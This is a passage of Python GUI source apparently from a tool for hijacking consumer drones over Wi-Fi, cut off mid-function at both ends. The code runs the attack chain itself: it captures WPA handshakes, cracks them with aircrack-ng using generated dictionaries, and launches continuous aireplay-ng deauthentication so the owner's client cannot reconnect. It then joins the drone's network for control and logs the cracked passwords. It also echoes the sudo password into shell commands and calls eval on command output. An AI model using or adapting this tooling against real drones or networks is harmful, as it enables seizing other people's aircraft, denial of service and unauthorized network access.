                    dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
                self.progressbar.stop()
                self.info_label.config(text = "Done.")
                four_way_handshake_convert_file = current_path + "/handshake/hashcat_convert_file/" + selected_bssid + "_" + four_way_handshake_file_timestamp + ".hccapx"
                handshake_message = "4 way handshake file save at: " + current_path + "/handshake, the name is:\n" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01."
                try:
                    if cracked_password_output != "":
                        if messagebox.askyesno("Request Processed", "The 4-way handshake file is collected, would you like to generate a simple password dictionary based on the password which is previous success connect, and try to crack it locally?"):
                            try:
                                self.step3_label.config(text = "Cracking password locally                            ", image = self.label_loading_icon, compound = "right")
                            except: #If icon not found
                                self.step3_label.config(text = "Cracking password locally                            ☐")
                            self.info_label.config(text = "Cracking password locally.")
                            check_wifi_connect_states = "nmcli d show " + selected_interface + " 2>&1 | grep 'GENERAL.STATE:' | awk '{print $3}'"
                            get_wifi_connect_states = subprocess.Popen(check_wifi_connect_states, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout #Get Wi-Fi connection state
                            wifi_connect_states = get_wifi_connect_states.read().splitlines()
                            wifi_connect_state_convert = str(wifi_connect_states) #Convert to string
                            wifi_connect_states_strip = wifi_connect_state_convert.strip("[]") #Remove characters "[]"
                            wifi_connect_states_strip_bracket = eval(wifi_connect_states_strip) #Remove characters "''"
                            return_wifi_connect_states = wifi_connect_states_strip_bracket.strip("()") #Remove characters "()"
                            disconect_wifi = "nmcli dev disconnect " + selected_interface
                            if return_wifi_connect_states == "connected": #If Wi-Fi connected
                                disconnect_wifi = subprocess.Popen(disconect_wifi, stdout = subprocess.PIPE, shell = True)
                                disconnect_wifi.wait()
                            elif return_wifi_connect_states == "connecting": #If connecting a Wi-Fi network
                                disconnect_wifi = subprocess.Popen(disconect_wifi, stdout = subprocess.PIPE, shell = True)
                                disconnect_wifi.wait()
                            password_dictionary_path = current_path + "/handshake/password_dictionary/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "_lite_dictionary" + ".txt"
                            changed_password_generator_lite.passwordInsert(cracked_password_output, password_dictionary_path)
                            changed_password_generator_lite.oneChange(cracked_password_output, password_dictionary_path)
                            local_cracking_password_states = "aircrack-ng " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.cap -w " + current_path + "/handshake/password_dictionary/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "_lite_dictionary" + ".txt 2>&1 | grep 'KEY FOUND!' | awk '{print $4}'"
                            #print(local_cracking_password_states)
                            get_local_cracking_password_states = subprocess.Popen(local_cracking_password_states, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout #Get local password cracking state
                            local_cracking_password_states = get_local_cracking_password_states.read().splitlines()
                            local_cracked_password = local_cracking_password_states[:1]
                            local_cracked_password_convert = str(local_cracked_password) #Convert to string
                            #print(local_cracked_password_convert)
                            try:
                                local_cracked_password_strip = local_cracked_password_convert.strip("[]") #Remove characters "[]"
                                local_cracked_password = eval(local_cracked_password_strip) #Remove characters "''"
                                success_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                                self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                                if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                                    target_BSSID_log = [selected_bssid]
                                    channel_log = [selected_channel]
                                    privacy_log = [selected_privacy]
                                    password_log = [local_cracked_password]
                                    manufacturer_log = [matched_manufacturer]
                                    client_BSSID_log = [selected_ap_client]
                                    remote_server_timestamp_log = [success_timestamp]
                                    states_log = ["BSSID: " + selected_bssid + " password cracked. The password is: " + local_cracked_password]
                                    dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log, "timestamp":remote_server_timestamp_log, "states":states_log})
                                    dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
                                self.check_cracked_password_list_file = Path(current_path + "/data/cracked_password_list.csv")
                                if self.check_cracked_password_list_file.is_file(): #Check "cracked_password_list.csv" is really exist
                                    cracked_BSSID_log = [selected_bssid]
                                    password_log = [local_cracked_password]
                                    remote_server_timestamp_log = [success_timestamp]
                                    dataframe = pd.DataFrame({"cracked_BSSID":cracked_BSSID_log, "password":password_log, "timestamp":remote_server_timestamp_log})
                                    dataframe.to_csv(current_path + "/data/cracked_password_list.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "cracked_password_list.csv"
                                try:
                                    self.step3_label.config(text = "Cracking password locally                            ", image = self.label_finish_icon, compound = "right")
                                except: #If icon not found
                                    self.step3_label.config(text = "Cracking password locally                            ☑")
                                self.info_label.config(text = "Password cracked.")
                                cracked_password_message = "The password is: " + local_cracked_password + "\n\nWould you like to connect with your previously selected target?"
                                if messagebox.askokcancel("Successfully Cracked", cracked_password_message):
                                    self.load_attack()
                                    app.after(2000, self.check_askstring)
                            except SyntaxError: #If not password matched
                                failed_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                                self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                                if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                                    target_BSSID_log = [selected_bssid]
                                    channel_log = [selected_channel]
                                    privacy_log = [selected_privacy]
                                    password_log = [""]
                                    manufacturer_log = [matched_manufacturer]
                                    client_BSSID_log = [selected_ap_client]
                                    remote_server_timestamp_log = [failed_timestamp]
                                    states_log = ["BSSID: " + selected_bssid + " password cannot be cracked by lite dictionary."]
                                    dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log, "timestamp":remote_server_timestamp_log, "states":states_log})
                                    dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
                                try:
                                    self.step3_label.config(text = "Cracking password locally                            ", image = self.label_fail_icon, compound = "right")
                                except: #If icon not found
                                    self.step3_label.config(text = "Cracking password locally                            ☒")
                                self.info_label.config(text = "Failed to crack the password locally.")
                                get_messagebox_states = messagebox.askyesnocancel("Error", "Failed to crack the password locally.\n\nWould you like to connect to the remote server for cracking the password, or press 'No' for try to enter the password again?")
                                if get_messagebox_states == True:
                                    self.destroy_wifi_attack_gui()
                                    self.controller.show_frame("RemoteServerConnect")
                                elif get_messagebox_states == False:
                                    self.load_attack()
                                    app.after(2000, self.check_askstring)
                                elif get_messagebox_states == None:
                                    handshake_message = "4 way handshake file save at: " + current_path + "/handshake, the name is:\n" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.\n\nWould you like to keep running deauthentication attack to prevent the client reconnect to the drone?"
                                    if messagebox.askyesno("Request Processed", handshake_message):
                                        deauth_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'deauthinfo' -hold -e 'aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
                                        subprocess.Popen(deauth_info, stdout = subprocess.PIPE, shell = True)
                                        if messagebox.showinfo("Wi-Fi Deauthentication", "Please press 'OK' to stop Wi-Fi Deauthentication attack."):
                                            find_xterm_aireplay_pid = "ps ax | grep 'xterm -iconic -T deauthinfo -hold -e aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'" + " | grep -v grep | grep -v sudo | awk '{print $1}'"
                                            get_xterm_aireplay_pid = subprocess.Popen(find_xterm_aireplay_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
                                            xterm_aireplay_pid = get_xterm_aireplay_pid.read().splitlines()
                                            xterm_aireplay_pid_convert = str(xterm_aireplay_pid) #Convert to string
                                            xterm_aireplay_pid_strip = xterm_aireplay_pid_convert.strip("[]") #Remove characters "[]"
                                            return_xterm_aireplay_pid = eval(xterm_aireplay_pid_strip) #Remove characters "''"
                                            colse_xterm_aireplay = "echo " + sudo_password + " | sudo -S kill " + return_xterm_aireplay_pid
                                            close_xterm_aireplay_terminal = subprocess.Popen(colse_xterm_aireplay, stdout = subprocess.PIPE, shell = True) #For close the xterm aireplay terminal
                                            close_xterm_aireplay_terminal.wait()
                                            time.sleep(0.3)
                                            self.destroy_wifi_attack_gui()
                                            self.controller.show_frame("StartPage")
                                    else:
                                        self.destroy_wifi_attack_gui()
                                        self.controller.show_frame("StartPage")
                        else:
                            if messagebox.showinfo("Request Processed", handshake_message):
                                self.destroy_wifi_attack_gui()
                                self.controller.show_frame("StartPage")
                    else:
                        if messagebox.askyesno("Request Processed", "The 4-way handshake file is collected, would you like to connect to the remote server for cracking the password?"):
                            check_wifi_connect_states = "nmcli d show " + selected_interface + " 2>&1 | grep 'GENERAL.STATE:' | awk '{print $3}'"
                            get_wifi_connect_states = subprocess.Popen(check_wifi_connect_states, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout #Get Wi-Fi connection state
                            wifi_connect_states = get_wifi_connect_states.read().splitlines()
                            wifi_connect_state_convert = str(wifi_connect_states) #Convert to string
                            wifi_connect_states_strip = wifi_connect_state_convert.strip("[]") #Remove characters "[]"
                            wifi_connect_states_strip_bracket = eval(wifi_connect_states_strip) #Remove characters "''"
                            return_wifi_connect_states = wifi_connect_states_strip_bracket.strip("()") #Remove characters "()"
                            disconect_wifi = "nmcli dev disconnect " + selected_interface
                            if return_wifi_connect_states == "connected": #If Wi-Fi connected
                                disconnect_wifi = subprocess.Popen(disconect_wifi, stdout = subprocess.PIPE, shell = True)
                                disconnect_wifi.wait()
                            elif return_wifi_connect_states == "connecting": #If connecting a Wi-Fi network
                                disconnect_wifi = subprocess.Popen(disconect_wifi, stdout = subprocess.PIPE, shell = True)
                                disconnect_wifi.wait()
                            self.destroy_wifi_attack_gui()
                            self.controller.show_frame("RemoteServerConnect")
                        else:
                            if messagebox.showinfo("Request Processed", handshake_message):
                                self.destroy_wifi_attack_gui()
                                self.controller.show_frame("StartPage")
                except NameError:
                    if messagebox.askyesno("Request Processed", "The 4-way handshake file is collected, would you like to connect to the remote server for cracking the password?"):
                        check_wifi_connect_states = "nmcli d show " + selected_interface + " 2>&1 | grep 'GENERAL.STATE:' | awk '{print $3}'"
                        get_wifi_connect_states = subprocess.Popen(check_wifi_connect_states, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout #Get Wi-Fi connection state
                        wifi_connect_states = get_wifi_connect_states.read().splitlines()
                        wifi_connect_state_convert = str(wifi_connect_states) #Convert to string
                        wifi_connect_states_strip = wifi_connect_state_convert.strip("[]") #Remove characters "[]"
                        wifi_connect_states_strip_bracket = eval(wifi_connect_states_strip) #Remove characters "''"
                        return_wifi_connect_states = wifi_connect_states_strip_bracket.strip("()") #Remove characters "()"
                        disconect_wifi = "nmcli dev disconnect " + selected_interface
                        if return_wifi_connect_states == "connected": #If Wi-Fi connected
                            disconnect_wifi = subprocess.Popen(disconect_wifi, stdout = subprocess.PIPE, shell = True)
                            disconnect_wifi.wait()
                        elif return_wifi_connect_states == "connecting": #If connecting a Wi-Fi network
                            disconnect_wifi = subprocess.Popen(disconect_wifi, stdout = subprocess.PIPE, shell = True)
                            disconnect_wifi.wait()
                        self.destroy_wifi_attack_gui()
                        self.controller.show_frame("RemoteServerConnect")
                    else:
                        if messagebox.showinfo("Request Processed", handshake_message):
                            self.destroy_wifi_attack_gui()
                            self.controller.show_frame("StartPage")
            else:
                self.check_four_way_handshake_cap_file = Path(current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.cap")
                if self.check_four_way_handshake_cap_file.is_file(): #Check "00:00:00:00:00:00_00000000-000000-01.cap" is really exist
                    subprocess.Popen("echo " + sudo_password + " | sudo -S rm " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.cap", stdout = subprocess.PIPE, shell = True)
                self.check_four_way_handshake_csv_file = Path(current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.csv")
                if self.check_four_way_handshake_csv_file.is_file(): #Check "00:00:00:00:00:00_00000000-000000-01.csv" is really exist
                    subprocess.Popen("echo " + sudo_password + " | sudo -S rm " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.csv", stdout = subprocess.PIPE, shell = True)
                self.check_four_way_handshake_kismet_csv_file = Path(current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.kismet.csv")
                if self.check_four_way_handshake_kismet_csv_file.is_file(): #Check "00:00:00:00:00:00_00000000-000000-01.kismet.csv" is really exist
                    subprocess.Popen("echo " + sudo_password + " | sudo -S rm " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.kismet.csv", stdout = subprocess.PIPE, shell = True)
                self.check_four_way_handshake_kismet_netxml_file = Path(current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.kismet.netxml")
                if self.check_four_way_handshake_kismet_netxml_file.is_file(): #Check "00:00:00:00:00:00_00000000-000000-01.kismet.netxml" is really exist
                    subprocess.Popen("echo " + sudo_password + " | sudo -S rm " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.kismet.netxml", stdout = subprocess.PIPE, shell = True)
                self.check_four_way_handshake_log_csv_file = Path(current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.log.csv")
                if self.check_four_way_handshake_log_csv_file.is_file(): #Check "00:00:00:00:00:00_00000000-000000-01.log.csv" is really exist
                    subprocess.Popen("echo " + sudo_password + " | sudo -S rm " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.log.csv", stdout = subprocess.PIPE, shell = True)
                self.check_hashcat_convert_file = Path(current_path + "/handshake/hashcat_convert_file/" + selected_bssid + "_" + four_way_handshake_file_timestamp + ".hccapx")
                if self.check_hashcat_convert_file.is_file(): #Check "00:00:00:00:00:00_00000000-000000.hccapx" is really exist
                    subprocess.Popen("echo " + sudo_password + " | sudo -S rm " + current_path + "/handshake/hashcat_convert_file/" + selected_bssid + "_" + four_way_handshake_file_timestamp + ".hccapx", stdout = subprocess.PIPE, shell = True)
                try:
                    self.step2_label.config(text = "Collect 4-way handshake                              ", image = self.label_fail_icon, compound = "right")
                except: #If icon not found
                    self.step2_label.config(text = "Collect 4-way handshake                              ☒")
                failed_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                    target_BSSID_log = [selected_bssid]
                    channel_log = [selected_channel]
                    privacy_log = [selected_privacy]
                    password_log = [""]
                    manufacturer_log = [matched_manufacturer]
                    client_BSSID_log = [selected_ap_client]
                    connect_timestamp_log = [failed_timestamp]
                    states_log = ["Error: Cannot collect 4-way handshake"]
                    dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log, "timestamp":connect_timestamp_log, "states":states_log})
                    dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv"
                self.progressbar.stop()
                self.info_label.config(text = "Failed to complete.")
                if messagebox.askretrycancel("Error", "Cannot collect 4-way handshake."):
                    self.progressbar.start()
                    threading.Thread(target = self.encrypted_wifi_network).start()
                else:
                    self.destroy_wifi_attack_gui()
                    self.controller.show_frame("StartPage")
        else:
            self.check_four_way_handshake_cap_file = Path(current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.cap")
            if self.check_four_way_handshake_cap_file.is_file(): #Check "00:00:00:00:00:00_00000000-000000-01.cap" is really exist
                subprocess.Popen("echo " + sudo_password + " | sudo -S rm " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.cap", stdout = subprocess.PIPE, shell = True)
            self.check_four_way_handshake_csv_file = Path(current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.csv")
            if self.check_four_way_handshake_csv_file.is_file(): #Check "00:00:00:00:00:00_00000000-000000-01.csv" is really exist
                subprocess.Popen("echo " + sudo_password + " | sudo -S rm " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.csv", stdout = subprocess.PIPE, shell = True)
            self.check_four_way_handshake_kismet_csv_file = Path(current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.kismet.csv")
            if self.check_four_way_handshake_kismet_csv_file.is_file(): #Check "00:00:00:00:00:00_00000000-000000-01.kismet.csv" is really exist
                subprocess.Popen("echo " + sudo_password + " | sudo -S rm " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.kismet.csv", stdout = subprocess.PIPE, shell = True)
            self.check_four_way_handshake_kismet_netxml_file = Path(current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.kismet.netxml")
            if self.check_four_way_handshake_kismet_netxml_file.is_file(): #Check "00:00:00:00:00:00_00000000-000000-01.kismet.netxml" is really exist
                subprocess.Popen("echo " + sudo_password + " | sudo -S rm " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.kismet.netxml", stdout = subprocess.PIPE, shell = True)
            self.check_four_way_handshake_log_csv_file = Path(current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.log.csv")
            if self.check_four_way_handshake_log_csv_file.is_file(): #Check "00:00:00:00:00:00_00000000-000000-01.log.csv" is really exist
                subprocess.Popen("echo " + sudo_password + " | sudo -S rm " + current_path + "/handshake/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "-01.log.csv", stdout = subprocess.PIPE, shell = True)
            self.check_hashcat_convert_file = Path(current_path + "/handshake/hashcat_convert_file/" + selected_bssid + "_" + four_way_handshake_file_timestamp + ".hccapx")
            if self.check_hashcat_convert_file.is_file(): #Check "00:00:00:00:00:00_00000000-000000.hccapx" is really exist
                subprocess.Popen("echo " + sudo_password + " | sudo -S rm " + current_path + "/handshake/hashcat_convert_file/" + selected_bssid + "_" + four_way_handshake_file_timestamp + ".hccapx", stdout = subprocess.PIPE, shell = True)
            try:
                self.step2_label.config(text = "Collect 4-way handshake                              ", image = self.label_fail_icon, compound = "right")
            except: #If icon not found
                self.step2_label.config(text = "Collect 4-way handshake                              ☒")
            failed_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
            self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
            if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                target_BSSID_log = [selected_bssid]
                channel_log = [selected_channel]
                privacy_log = [selected_privacy]
                password_log = [""]
                manufacturer_log = [matched_manufacturer]
                client_BSSID_log = [selected_ap_client]
                connect_timestamp_log = [failed_timestamp]
                states_log = ["Error: Cannot collect 4-way handshake"]
                dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log, "timestamp":connect_timestamp_log, "states":states_log})
                dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv"
            self.progressbar.stop()
            self.info_label.config(text = "Failed to collect.")
            if messagebox.askretrycancel("Error", "Cannot collect 4-way handshake."):
                threading.Thread(target = self.encrypted_wifi_network).start()
            else:
                self.destroy_wifi_attack_gui()
                self.controller.show_frame("StartPage")


    def restart_network(self):
        try:
            check_wifi_connect_states = "nmcli d show " + selected_interface + " 2>&1 | grep 'GENERAL.STATE:' | awk '{print $3}'"
            get_wifi_connect_states = subprocess.Popen(check_wifi_connect_states, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout #Get Wi-Fi connection state
            wifi_connect_states = get_wifi_connect_states.read().splitlines()
            wifi_connect_state_convert = str(wifi_connect_states) #Convert to string
            wifi_connect_states_strip = wifi_connect_state_convert.strip("[]") #Remove characters "[]"
            wifi_connect_states_strip_bracket = eval(wifi_connect_states_strip) #Remove characters "''"
            return_wifi_connect_states = wifi_connect_states_strip_bracket.strip("()") #Remove characters "()"
            disconect_wifi = "nmcli dev disconnect " + selected_interface
            if return_wifi_connect_states == "connected": #If Wi-Fi connected
                disconnect_wifi = subprocess.Popen(disconect_wifi, stdout = subprocess.PIPE, shell = True)
                disconnect_wifi.wait()
            elif return_wifi_connect_states == "connecting": #If connecting a Wi-Fi network
                disconnect_wifi = subprocess.Popen(disconect_wifi, stdout = subprocess.PIPE, shell = True)
                disconnect_wifi.wait()
            self.info_label.config(text = "Switching Wi-Fi adapter to manage mode.")
            interface_down = "echo " + sudo_password + " | sudo -S ifconfig " + selected_interface + " down"
            interface_mode_managed = "echo " + sudo_password + " | sudo -S iwconfig " + selected_interface + " mode managed"
            interface_up = "echo " + sudo_password + " | sudo -S ifconfig " + selected_interface + " up"
            interface_down_states = subprocess.Popen(interface_down, stdout = subprocess.PIPE, shell = True)
            interface_down_states.wait()
            interface_mode_managed_states = subprocess.Popen(interface_mode_managed, stdout = subprocess.PIPE, shell = True)
            interface_mode_managed_states.wait()
            interface_up_states = subprocess.Popen(interface_up, stdout = subprocess.PIPE, shell = True)
            interface_up_states.wait()
            restart_network_service = "echo " + sudo_password + " | sudo -S service network-manager restart"
            restart_network_service_state = subprocess.Popen(restart_network_service, stdout = subprocess.PIPE, shell = True)
            restart_network_service_state.wait()
            time.sleep(3.0)
            if selected_privacy == "OPN":
                try:
                    self.step2_label.config(text = "Switch Wi-Fi adapter to manage mode      ", image = self.label_finish_icon, compound = "right")
                except: #If icon not found
                    self.step2_label.config(text = "Switch Wi-Fi adapter to manage mode      ☑")
            else:
                try:
                    self.step3_label.config(text = "Switch Wi-Fi adapter to manage mode      ", image = self.label_finish_icon, compound = "right")
                except: #If icon not found
                    self.step3_label.config(text = "Switch Wi-Fi adapter to manage mode      ☑")
            self.connect_access_point()
        except:
            if selected_privacy == "OPN":
                try:
                    self.step2_label.config(text = "Switch Wi-Fi adapter to manage mode      ", image = self.label_fail_icon, compound = "right")
                except: #If icon not found
                    self.step2_label.config(text = "Switch Wi-Fi adapter to manage mode      ☒")
            else:
                try:
                    self.step3_label.config(text = "Switch Wi-Fi adapter to manage mode      ", image = self.label_fail_icon, compound = "right")
                except: #If icon not found
                    self.step3_label.config(text = "Switch Wi-Fi adapter to manage mode      ☒")
            if messagebox.askretrycancel("Error", "An error occurred while processing your request."):
                self.restart_network()

    def connect_access_point(self):
        global connect_access_point_timestamp
        self.info_label.config(text = "Trying to connect your selected target.")
        subprocess.Popen("echo " + sudo_password + " | sudo -S killall nm-applet", stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True)
        time.sleep(3.0)
        if selected_privacy == "OPN":
            connect_info = "nmcli d wifi connect " +  selected_bssid
        else:
            connect_info = "nmcli d wifi connect " +  selected_bssid + " password " + user_provide_password
        #print(connect_info)
        get_connect_info_state = subprocess.Popen(connect_info, shell = True, stdout = subprocess.PIPE, universal_newlines = True).stdout
        connect_info_state_read = get_connect_info_state.read().splitlines()
        connect_info_state = str(connect_info_state_read) #Convert to string
        #print(connect_info_state)
        subprocess.Popen("nohup nm-applet &", stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True)
        if connect_info_state.find("successfully") > 0: #Connect the Wi-Fi network successfully
            if selected_privacy == "OPN":
                try:
                    self.step3_label.config(text = "Connect your selected target                      ", image = self.label_finish_icon, compound = "right")
                except:
                    self.step3_label.config(text = "Connect your selected target                      ☑")
                connect_access_point_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                    target_BSSID_log = [selected_bssid]
                    channel_log = [selected_channel]
                    privacy_log = [selected_privacy]
                    password_log = [""]
                    manufacturer_log = [matched_manufacturer]
                    client_BSSID_log = [selected_ap_client]
                    connect_timestamp_log = [connect_access_point_timestamp]
                    states_log = ["Connected"]
                    dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log, "timestamp":connect_timestamp_log, "states":states_log})
                    dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv"
            else:
                try:
                    self.step4_label.config(text = "Connect your selected target                      ", image = self.label_finish_icon, compound = "right")
                except:
                    self.step4_label.config(text = "Connect your selected target                      ☑")
                connect_access_point_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                    target_BSSID_log = [selected_bssid]
                    channel_log = [selected_channel]
                    privacy_log = [selected_privacy]
                    password_log = [user_provide_password]
                    manufacturer_log = [matched_manufacturer]
                    client_BSSID_log = [selected_ap_client]
                    connect_timestamp_log = [connect_access_point_timestamp]
                    states_log = ["Connected"]
                    dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log, "timestamp":connect_timestamp_log, "states":states_log})
                    dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv"
                self.check_cracked_password_list_file = Path(current_path + "/data/cracked_password_list.csv")
                if self.check_cracked_password_list_file.is_file(): #Check "cracked_password_list.csv" is really exist
                    cracked_BSSID_log = [selected_bssid]
                    password_log = [user_provide_password]
                    connect_timestamp_log = [connect_access_point_timestamp]
                    dataframe = pd.DataFrame({"cracked_BSSID":cracked_BSSID_log, "password":password_log, "timestamp":connect_timestamp_log})
                    dataframe.to_csv(current_path + "/data/cracked_password_list.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "cracked_password_list.csv"
            self.info_label.config(text = "Connected.")
            self.progressbar.stop()
            time.sleep(1.0)
            self.destroy_wifi_attack_gui()
            self.controller.show_frame("DroneControl")
        elif connect_info_state.find("failed") > 0: #Fail to connect the Wi-Fi network
            interface_down = "echo " + sudo_password + " | sudo -S ifconfig " + selected_interface + " down"
            interface_mode_monitor = "echo " + sudo_password + " | sudo -S iwconfig " + selected_interface + " mode monitor"
            interface_up = "echo " + sudo_password + " | sudo -S ifconfig " + selected_interface + " up"
            interface_down_states = subprocess.Popen(interface_down, stdout = subprocess.PIPE, shell = True)
            interface_down_states.wait()
            interface_mode_monitor_states = subprocess.Popen(interface_mode_monitor, stdout = subprocess.PIPE, shell = True)
            interface_mode_monitor_states.wait()
            interface_up_states = subprocess.Popen(interface_up, stdout = subprocess.PIPE, shell = True)
            interface_up_states.wait()
            self.progressbar.stop()
            self.info_label.config(text = "Failed to connect.")
            if selected_privacy == "OPN":
                try:
                    self.step3_label.config(text = "Connect your selected target                      ", image = self.label_fail_icon, compound = "right")
                except:
                    self.step3_label.config(text = "Connect your selected target                      ☒")
            else:
                try:
                    self.step4_label.config(text = "Connect your selected target                      ", image = self.label_fail_icon, compound = "right")
                except:
                    self.step4_label.config(text = "Connect your selected target                      ☒")
                connect_access_point_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                    target_BSSID_log = [selected_bssid]
                    channel_log = [selected_channel]
                    privacy_log = [selected_privacy]
                    password_log = [user_provide_password]
                    manufacturer_log = [matched_manufacturer]
                    client_BSSID_log = [selected_ap_client]
                    connect_timestamp_log = [connect_access_point_timestamp]
                    states_log = ["Failed to connect BSSID: " + selected_bssid]
                    dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log, "timestamp":connect_timestamp_log, "states":states_log})
                    dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv"
            if selected_privacy == "OPN":
                if messagebox.askretrycancel("Error", "A connection failure occurred."):
                    check_wifi_connect_states = "nmcli d show " + selected_interface + " 2>&1 | grep 'GENERAL.STATE:' | awk '{print $3}'"
                    get_wifi_connect_states = subprocess.Popen(check_wifi_connect_states, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout #Get Wi-Fi connection state
                    wifi_connect_states = get_wifi_connect_states.read().splitlines()
                    wifi_connect_state_convert = str(wifi_connect_states) #Convert to string
                    wifi_connect_states_strip = wifi_connect_state_convert.strip("[]") #Remove characters "[]"
                    wifi_connect_states_strip_bracket = eval(wifi_connect_states_strip) #Remove characters "''"
                    return_wifi_connect_states = wifi_connect_states_strip_bracket.strip("()") #Remove characters "()"
                    disconect_wifi = "nmcli dev disconnect " + selected_interface
                    if return_wifi_connect_states == "connected": #If Wi-Fi connected
                        disconnect_wifi = subprocess.Popen(disconect_wifi, stdout = subprocess.PIPE, shell = True)
                        disconnect_wifi.wait()
                    elif return_wifi_connect_states == "connecting": #If connecting a Wi-Fi network
                        disconnect_wifi = subprocess.Popen(disconect_wifi, stdout = subprocess.PIPE, shell = True)
                        disconnect_wifi.wait()
                    self.connect_access_point()
            else:
